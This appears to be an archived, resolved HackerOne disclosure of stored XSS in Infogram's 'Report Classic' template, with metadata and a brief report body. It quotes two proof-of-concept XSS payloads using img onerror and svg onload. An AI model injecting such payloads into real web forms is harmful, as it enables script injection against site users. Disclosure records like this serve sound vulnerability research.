---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2017-11-01
submitted: 2017-10-27T15:57:21.110Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/infogram|Infogram]]"
reporter: "mondhers"
source: "https://hackerone.com/reports/283565"
title: "XSS on infogram.com"
---
# XSS on infogram.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 10 | **Program:** Infogram | **Disclosed:** 2017-11-01

- Report: [https://hackerone.com/reports/283565](https://hackerone.com/reports/283565)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-10-27T15:57:21.110Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,

There is a XSS on Report templates.

Free templates : Report Classic 

When we modify the values of table we can put XSS Payload.

Payload used : 

"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
